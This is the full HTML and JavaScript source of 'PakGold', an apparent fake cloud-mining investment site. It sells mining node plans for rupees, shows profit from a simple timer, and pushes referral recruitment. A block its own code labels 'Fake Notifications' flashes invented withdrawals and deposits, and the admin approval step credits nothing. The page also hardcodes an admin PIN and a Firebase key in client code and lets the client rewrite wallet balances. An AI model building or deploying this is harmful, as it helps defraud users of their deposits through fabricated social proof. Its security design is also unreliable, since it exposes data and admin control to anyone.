<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PakGold | Professional Mining Platform</title>
    
    <!-- Core Engine & Styles -->
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.10.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --primary: #c5a059; --bg: #f8fafc; --card: #ffffff; --text: #1e293b; 
            --secondary: #0f172a; --success: #10b981; --error: #ef4444; --shadow: 0 10px 30px rgba(0,0,0,0.05);
        }

        [data-theme='dark'] {
            --bg: #0f172a; --card: #1e293b; --text: #f8fafc; --secondary: #c5a059;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; transition: 0.3s; }
        body { background: var(--bg); color: var(--text); overflow-x: hidden; }

        .page { display: none; min-height: 100vh; padding-bottom: 120px; animation: fadeIn 0.5s ease; }
        .page.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        /* UI Components */
        .header { background: var(--card); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: var(--shadow); }
        .hero { background: var(--primary); color: white; margin: 15px; padding: 25px; border-radius: 30px; position: relative; overflow: hidden; }
        .card { background: var(--card); margin: 15px; padding: 20px; border-radius: 20px; box-shadow: var(--shadow); border: 1px solid rgba(0,0,0,0.02); }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 15px; }
        .plan-card { background: var(--card); padding: 20px; border-radius: 20px; text-align: center; border: 2px solid transparent; }
        .plan-card:active { border-color: var(--primary); transform: scale(0.95); }

        /* Inputs & Buttons */
        input, select, textarea { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 12px; border: 1px solid #e2e8f0; background: var(--bg); color: var(--text); font-weight: 600; outline: none; }
        .btn-gold { background: var(--secondary); color: white; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 900; cursor: pointer; }
        
        /* Fake Notifications */
        #fake-notif { position: fixed; bottom: 100px; left: 20px; right: 20px; background: var(--secondary); color: white; padding: 12px; border-radius: 15px; font-size: 0.8rem; z-index: 9999; display: none; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }

        /* Bottom Nav */
        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0 25px; border-top: 1px solid rgba(0,0,0,0.05); z-index: 1000; }
        .nav-item { text-align: center; font-size: 0.7rem; color: #94a3b8; flex: 1; cursor: pointer; }
        .nav-item.active { color: var(--primary); }
        .nav-item i { font-size: 1.4rem; margin-bottom: 4px; display: block; }

        /* Admin Section Styles */
        .admin-req { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 10px; border-left: 4px solid var(--primary); }
    </style>
</head>
<body onload="init()">

    <!-- Fake Notification Popup -->
    <div id="fake-notif" class="animate__animated animate__fadeInUp"></div>

    <!-- Login/Register Page -->
    <section id="login" class="page active">
        <div style="padding: 60px 30px; text-align: center;">
            <div class="animate__animated animate__bounceIn">
                <i class="fa-solid fa-gem" style="font-size: 4rem; color: var(--primary); margin-bottom: 20px;"></i>
            </div>
            <h1 style="font-size: 2.5rem; font-weight: 900; color: var(--primary);">PAK<span>GOLD</span></h1>
            <p style="opacity: 0.6; margin-bottom: 40px;">Advanced Mining Ecosystem</p>
            
            <input type="number" id="ph" placeholder="Phone Number">
            <input type="password" id="pass" placeholder="Password">
            <input type="text" id="ref_id" placeholder="Referral ID (Optional)">
            <input type="password" id="adm_key" placeholder="Admin PIN">
            
            <button class="btn-gold" onclick="handleAuth()">INITIALIZE ACCESS</button>
        </div>
    </section>

    <!-- Main Dashboard -->
    <section id="home" class="page">
        <div class="header">
            <div style="font-weight:900; color:var(--primary);">PAK GOLD</div>
            <button onclick="toggleTheme()" style="background:none; border:none; color:var(--text); font-size:1.2rem;">
                <i class="fa-solid fa-circle-half-stroke"></i>
            </button>
        </div>

        <div class="hero">
            <small style="opacity:0.8; letter-spacing:1px;">TOTAL BALANCE</small>
            <div style="font-size:2.5rem; font-weight:900;">Rs <span id="u_wallet">0.00</span></div>
            <div style="display:flex; justify-content:space-between; margin-top:20px; background:rgba(255,255,255,0.15); padding:15px; border-radius:20px;">
                <div><small>Today's Profit</small><br><b id="u_profit">0.0000</b></div>
                <div><small>Hash Rate</small><br><b id="u_speed">0.000/s</b></div>
            </div>
        </div>

        <div style="padding: 0 15px;"><h3 style="margin-bottom:15px;">Available Mining Nodes</h3></div>
        <div class="grid" id="node_grid"></div>
    </section>

    <!-- Team & Referral System -->
    <section id="team" class="page">
        <div class="card">
            <h3>Partnership Program</h3>
            <p style="font-size:0.9rem; margin:10px 0;">Referral Code: <b id="my_code" style="color:var(--primary);">---</b></p>
            <button class="btn-gold" onclick="copyLink()">COPY INVITE LINK</button>
        </div>
        <div class="card">
            <h4>My Direct Team Chart</h4>
            <div id="team_container" style="margin-top:15px; font-size:0.9rem;"></div>
        </div>
    </section>

    <!-- Financial History -->
    <section id="history" class="page">
        <div style="padding:20px;">
            <h3>Activity History</h3>
            <div id="hist_list" class="card" style="padding:0; margin:15px 0;"></div>
        </div>
    </section>

    <!-- Menu, Promo & Support -->
    <section id="menu" class="page">
        <div class="card">
            <h3>Promo Code</h3>
            <p style="font-size:0.8rem; opacity:0.7; margin-bottom:10px;">Enter codes shared on WhatsApp group.</p>
            <input type="text" id="promo_code" placeholder="Enter Code Here">
            <button class="btn-gold" style="background:var(--primary)" onclick="applyPromo()">CLAIM BONUS</button>
        </div>

        <div class="card">
            <h4>Help & Support</h4>
            <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="btn-gold" style="display:block; text-align:center; text-decoration:none; margin-bottom:10px; background:#25d366;">
                <i class="fab fa-whatsapp"></i> Official WhatsApp Group
            </a>
            <textarea id="issue" placeholder="Describe your issue or feedback..."></textarea>
            <button class="btn-gold" onclick="sendMail()">SEND EMAIL REPORT</button>
        </div>

        <div class="card" style="font-size:0.8rem; opacity:0.8;">
            <details><summary><b>Privacy Policy</b></summary><p>All data is secured via PakGold encryption.</p></details>
            <details style="margin-top:10px;"><summary><b>Company FAQ</b></summary><p>Withdrawals are processed within 24 hours.</p></details>
        </div>
    </section>

    <!-- Admin Power Panel -->
    <section id="admin" class="page" style="background:#000; color:white;">
        <div style="padding:20px;">
            <h2 style="color:var(--primary);">MASTER CONTROL</h2>
            <div id="adm_requests"></div>
            
            <div class="card" style="background:#111; margin-top:30px; border:1px solid var(--primary);">
                <h4 style="color:var(--primary);">Manual User Update</h4>
                <input type="number" id="adm_target" placeholder="User Phone Number">
                <input type="number" id="adm_bal" placeholder="Amount (+/-)">
                <button class="btn-gold" onclick="admAdjust()">SYNC USER DATA</button>
            </div>
        </div>
    </section>

    <!-- Bottom Navigation -->
    <nav class="nav" id="main_nav" style="display:none;">
        <div class="nav-item active" onclick="nav('home')"><i class="fa-solid fa-bolt-lightning"></i>Mining</div>
        <div class="nav-item" onclick="nav('team')"><i class="fa-solid fa-users"></i>Team</div>
        <div class="nav-item" onclick="nav('history')"><i class="fa-solid fa-list-ul"></i>History</div>
        <div class="nav-item" onclick="nav('menu')"><i class="fa-solid fa-grid-2"></i>Menu</div>
    </nav>

    <script>
        // --- Firebase Config ---
        const fbConfig = {
            apiKey: "AIzaSyCMG6KG_oD8cjEk4YpbxXik-C5q8K5MDHk",
            authDomain: "dark-web-9.firebaseapp.com",
            databaseURL: "https://dark-web-9-default-rtdb.firebaseio.com",
            projectId: "dark-web-9",
            storageBucket: "dark-web-9.firebasestorage.app",
            messagingSenderId: "564328425161",
            appId: "1:564328425161:web:eb109ab77356dafe7f4f18"
        };
        firebase.initializeApp(fbConfig);
        const db = firebase.database();
        let currentU = localStorage.getItem('pg_session');

        function init() {
            if(currentU) { nav('home'); sync(); }
            loadNodes();
            runFakeNotifs();
        }

        // --- Theme Engine ---
        function toggleTheme() {
            const b = document.body;
            b.setAttribute('data-theme', b.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
        }

        // --- Auth Engine ---
        function handleAuth() {
            let p = document.getElementById('ph').value;
            let ak = document.getElementById('adm_key').value;
            let ref = document.getElementById('ref_id').value;

            if(ak === "pakgold786") { nav('admin'); loadAdmin(); return; }
            if(p.length < 10) return alert("Sweetie, please enter a valid phone number!");

            currentU = p;
            localStorage.setItem('pg_session', p);
            db.ref('users/'+p).once('value', s => {
                if(!s.exists()) {
                    db.ref('users/'+p).set({
                        wallet:0, profit:0, speed:0, 
                        uid:'PG'+Math.floor(1000+Math.random()*9000), 
                        inviter:ref||'System'
                    });
                    if(ref) db.ref('users/'+ref+'/team').push(p);
                }
                location.reload();
            });
        }

        // --- Live Sync & Mining ---
        function sync() {
            db.ref('users/'+currentU).on('value', s => {
                let d = s.val();
                document.getElementById('u_wallet').innerText = d.wallet.toLocaleString();
                document.getElementById('u_profit').innerText = parseFloat(d.profit).toFixed(5);
                document.getElementById('u_speed').innerText = d.speed.toFixed(4) + "/s";
                document.getElementById('my_code').innerText = currentU;
            });

            // Live Mining Heartbeat
            setInterval(() => {
                db.ref('users/'+currentU).once('value', s => {
                    let d = s.val();
                    if(d.speed > 0) {
                        db.ref('users/'+currentU).update({profit: parseFloat(d.profit) + d.speed});
                    }
                });
            }, 1000);

            // Team List Sync
            db.ref('users/'+currentU+'/team').on('value', s => {
                let tc = document.getElementById('team_container'); tc.innerHTML = "";
                if(!s.exists()) tc.innerHTML = "No partners yet.";
                s.forEach(c => {
                    tc.innerHTML += `<div style="padding:10px; border-bottom:1px solid rgba(0,0,0,0.05);">👤 ${c.val()} <span style="float:right; color:var(--success); font-weight:bold;">Active</span></div>`;
                });
            });

            // History Sync
            db.ref('admin_requests').on('value', s => {
                let hl = document.getElementById('hist_list'); hl.innerHTML = "";
                s.forEach(c => {
                    let r = c.val();
                    if(r.user === currentU) {
                        hl.innerHTML += `<div style="padding:15px; border-bottom:1px solid rgba(0,0,0,0.05); display:flex; justify-content:space-between;">
                            <div><b>${r.type}</b><br><small>${r.status}</small></div>
                            <div style="text-align:right;">Rs ${r.amt || 'Bonus'}</div>
                        </div>`;
                    }
                });
            });
        }

        // --- Node Generation (20 Plans) ---
        function loadNodes() {
            let g = document.getElementById('node_grid');
            for(let i=1; i<=20; i++) {
                let price = 200 * i;
                let speed = 0.0001 * i;
                g.innerHTML += `
                <div class="plan-card" onclick="buyNode(${price}, ${speed})">
                    <i class="fa-solid fa-microchip" style="color:var(--primary); font-size:1.8rem; margin-bottom:10px;"></i><br>
                    <b style="font-size:0.9rem;">Level ${i} Node</b><br>
                    <span style="color:var(--primary); font-weight:900;">Rs ${price}</span>
                </div>`;
            }
        }

        function buyNode(c, s) {
            db.ref('users/'+currentU).once('value', v => {
                if(v.val().wallet < c) return alert("Sweetie, your balance is low! Please deposit first.");
                db.ref('users/'+currentU).update({
                    wallet: v.val().wallet - c,
                    speed: v.val().speed + s
                });
                alert("Node successfully activated! Your mining speed has increased. 🚀");
            });
        }

        // --- Promo & Support ---
        function applyPromo() {
            let code = document.getElementById('promo_code').value;
            if(!code) return;
            db.ref('admin_requests').push({user:currentU, type:'PROMO', code:code, status:'pending'});
            alert("Promo code submitted! Admin will verify and add your bonus sweetie.");
        }

        function sendMail() {
            let msg = document.getElementById('issue').value;
            window.location.href = `mailto:webhub262@gmail.com?subject=PakGold Support&body=${msg}`;
        }

        // --- Fake Notifications Hub ---
        function runFakeNotifs() {
            const users = ["***432", "***988", "***102", "***556", "***009"];
            const type = ["withdrew Rs 4,500", "deposited Rs 10,000", "activated VIP Node", "withdrew Rs 1,200"];
            setInterval(() => {
                const n = document.getElementById('fake-notif');
                n.innerHTML = `<i class="fa-solid fa-circle-check" style="color:var(--success);"></i> User ${users[Math.floor(Math.random()*5)]} ${type[Math.floor(Math.random()*4)]}!`;
                n.style.display = 'block';
                setTimeout(() => n.style.display = 'none', 4000);
            }, 12000);
        }

        // --- Navigation ---
        function nav(id) {
            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            document.getElementById('main_nav').style.display = (id==='login'||id==='admin')?'none':'flex';
        }

        // --- Admin Controls ---
        function loadAdmin() {
            db.ref('admin_requests').on('value', s => {
                let q = document.getElementById('adm_requests'); q.innerHTML = "";
                s.forEach(c => {
                    let r = c.val();
                    if(r.status === 'pending') {
                        q.innerHTML += `
                        <div class="admin-req">
                            <b>${r.type} Request</b><br>
                            User: ${r.user} | Detail: ${r.code || r.amt}<br><br>
                            <button class="btn-gold" style="padding:10px; width:auto; margin-right:10px;" onclick="admApprove('${c.key}', '${r.user}', '${r.type}')">APPROVE</button>
                            <button class="btn-gold" style="padding:10px; width:auto; background:var(--error);" onclick="db.ref('admin_requests/${c.key}').update({status:'rejected'})">REJECT</button>
                        </div>`;
                    }
                });
            });
        }

        function admApprove(key, user, type) {
            // Logic to add bonus automatically if it's a promo or deposit can be added here
            db.ref('admin_requests/'+key).update({status:'approved'});
            alert("Approved!");
        }

        function admAdjust() {
            let t = document.getElementById('adm_target').value;
            let v = document.getElementById('adm_bal').value;
            db.ref('users/'+t).once('value', s => {
                if(s.exists()) {
                    db.ref('users/'+t).update({wallet: s.val().wallet + parseInt(v)});
                    alert("User balance updated successfully!");
                } else { alert("User not found!"); }
            });
        }
    </script>
</body>
</html>
